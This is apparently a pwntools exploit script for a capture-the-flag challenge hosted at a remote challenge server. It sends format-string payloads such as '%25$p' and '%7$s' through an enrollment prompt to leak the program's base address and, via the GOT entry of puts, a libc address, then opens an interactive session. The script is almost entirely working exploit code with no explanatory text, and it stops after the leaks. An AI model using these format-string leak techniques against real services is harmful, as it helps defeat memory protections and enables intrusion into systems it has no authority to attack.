from pwn import * 
context.log_level = 'debug'
binary = "./program"

#p = process(binary)
p = remote("chal.firebird.sh", 35042)
elf = ELF(binary)

# First get base address only
p.sendlineafter(b"What would you like to do?", b'1')
p.sendlineafter(b"ITSC email:", b'dummy')
p.sendlineafter(b"late enrollment:", b"%25$p")

p.sendlineafter(b"What would you like to do?", b'4')
p.recvuntil(b"Reason for late enrollment:\n")
main_addr = int(p.recvline().strip(), 16)
elf.address = main_addr - 0x1532
print(f"Base address: {hex(elf.address)}")

# Now get puts leak
p.sendlineafter(b"What would you like to do?", b'1')
p.sendlineafter(b"ITSC email:", p64(elf.got['puts']))
p.sendlineafter(b"late enrollment:", b"%7$s")  # Try different format string position

p.sendlineafter(b"What would you like to do?", b'4')
p.recvuntil(b"Email: ")
p.recv(7)  # Skip the GOT address that was our input

try:
    leak_raw = p.recvuntil(b"\nReason")[:-7]
    puts_addr = u64(leak_raw.ljust(8, b'\x00'))
    print(f"Puts leak (hex): {hex(puts_addr)}")
except Exception as e:
    print(f"Error: {e}")
    print(f"Raw received: {leak_raw.hex() if 'leak_raw' in locals() else 'nothing received'}")

p.interactive()